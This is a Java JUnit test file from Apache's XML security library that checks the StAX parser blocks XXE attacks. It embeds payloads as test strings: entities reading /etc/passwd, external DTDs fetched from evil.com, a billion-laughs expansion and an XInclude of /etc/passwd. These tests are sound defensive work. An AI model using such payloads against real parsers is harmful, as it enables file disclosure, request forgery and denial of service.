/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership. The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.xml.security.test.stax;

import org.apache.xml.security.stax.ext.InboundXMLSec;
import org.apache.xml.security.stax.ext.XMLSec;
import org.apache.xml.security.stax.ext.XMLSecurityProperties;
import org.apache.xml.security.test.stax.utils.StAX2DOM;
import org.apache.xml.security.utils.XMLUtils;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;

import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for XXE (XML External Entity) prevention in the STAX streaming API.
 * Verifies that DTD processing and external entities are disabled by default.
 */
class STAXXXEPreventionTest {

    private XMLInputFactory xmlInputFactory;

    static {
        org.apache.xml.security.Init.init();
    }

    public STAXXXEPreventionTest() {
        // Public constructor for JUnit
    }

    @BeforeEach
    public void setUp() throws Exception {
        XMLSec.init();
        xmlInputFactory = XMLInputFactory.newInstance();
    }

    /**
     * Test that external file entities are blocked in STAX signature processing.
     */
    @Test
    void testExternalFileEntityBlocked() throws Exception {
        String xxeXml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
            "]>\n" +
            "<root>&xxe;</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(xxeXml.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail when trying to process DTD
            assertThrows(XMLStreamException.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test that external HTTP entities are blocked.
     */
    @Test
    void testExternalHttpEntityBlocked() throws Exception {
        String xxeXml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://evil.com/evil.xml\">\n" +
            "]>\n" +
            "<root>&xxe;</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(xxeXml.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail when trying to process DTD
            assertThrows(XMLStreamException.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test that DOCTYPE declarations are disallowed.
     */
    @Test
    void testDoctypeDisallowed() throws Exception {
        String xmlWithDoctype =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE root [\n" +
            "  <!ELEMENT root ANY>\n" +
            "]>\n" +
            "<root>content</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(xmlWithDoctype.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail when encountering DOCTYPE
            assertThrows(XMLStreamException.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test that parameter entities are blocked.
     */
    @Test
    void testParameterEntityBlocked() throws Exception {
        String xxeXml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">\n" +
            "  %dtd;\n" +
            "]>\n" +
            "<root>data</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(xxeXml.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail when trying to process DTD (accepting any exception that is or wraps XMLStreamException)
            assertThrows(Exception.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test billion laughs attack (entity expansion) prevention.
     */
    @Test
    void testBillionLaughsBlocked() throws Exception {
        String billionLaughs =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE lolz [\n" +
            "  <!ENTITY lol \"lol\">\n" +
            "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
            "]>\n" +
            "<root>&lol4;</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(billionLaughs.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail when trying to process DTD
            assertThrows(XMLStreamException.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test that valid XML without DTD processes successfully.
     */
    @Test
    void testValidXmlWithoutDTD() throws Exception {
        String validXml = "<?xml version=\"1.0\"?><root><child>content</child></root>";

        try (InputStream is = new ByteArrayInputStream(validXml.getBytes(StandardCharsets.UTF_8))) {
            Document doc = XMLUtils.read(is, false);
            assertNotNull(doc);
            assertEquals("root", doc.getDocumentElement().getNodeName());
        }
    }

    /**
     * Test that internal entities are handled safely (if supported).
     */
    @Test
    void testInternalEntitiesHandledSafely() throws Exception {
        String xmlWithInternalEntity =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE root [\n" +
            "  <!ENTITY internal \"safe value\">\n" +
            "]>\n" +
            "<root>&internal;</root>";

        XMLSecurityProperties properties = new XMLSecurityProperties();
        InboundXMLSec inboundXMLSec = XMLSec.getInboundWSSec(properties);

        try (InputStream is = new ByteArrayInputStream(xmlWithInternalEntity.getBytes(StandardCharsets.UTF_8))) {
            XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(is);
            XMLStreamReader securityStreamReader = inboundXMLSec.processInMessage(xmlStreamReader, null, null);

            // Should fail because DTD is not allowed (even for internal entities)
            assertThrows(XMLStreamException.class, () -> {
                StAX2DOM.readDoc(securityStreamReader);
            });
        }
    }

    /**
     * Test that CDATA sections (which are safe) process correctly.
     */
    @Test
    void testCDATASectionsAllowed() throws Exception {
        String xmlWithCDATA =
            "<?xml version=\"1.0\"?>\n" +
            "<root><![CDATA[<>&\"']]></root>";

        try (InputStream is = new ByteArrayInputStream(xmlWithCDATA.getBytes(StandardCharsets.UTF_8))) {
            Document doc = XMLUtils.read(is, false);
            assertNotNull(doc);
            String content = doc.getDocumentElement().getTextContent();
            assertTrue(content.contains("<>&\"'"));
        }
    }

    /**
     * Test that XInclude is safely handled.
     */
    @Test
    void testXIncludeHandledSafely() throws Exception {
        String xmlWithXInclude =
            "<?xml version=\"1.0\"?>\n" +
            "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n" +
            "  <xi:include href=\"file:///etc/passwd\"/>\n" +
            "</root>";

        try (InputStream is = new ByteArrayInputStream(xmlWithXInclude.getBytes(StandardCharsets.UTF_8))) {
            // XInclude should not be expanded (parser doesn't enable XInclude by default)
            Document doc = XMLUtils.read(is, false);
            assertNotNull(doc);
            // The xi:include element should be present but not processed
            assertNotNull(doc.getDocumentElement());
        }
    }

    /**
     * Test that processing instructions don't introduce vulnerabilities.
     */
    @Test
    void testProcessingInstructionsSafe() throws Exception {
        String xmlWithPI =
            "<?xml version=\"1.0\"?>\n" +
            "<?xml-stylesheet type=\"text/xsl\" href=\"http://evil.com/evil.xsl\"?>\n" +
            "<root>content</root>";

        try (InputStream is = new ByteArrayInputStream(xmlWithPI.getBytes(StandardCharsets.UTF_8))) {
            // Processing instructions should be allowed but not executed by the parser
            Document doc = XMLUtils.read(is, false);
            assertNotNull(doc);
        }
    }
}
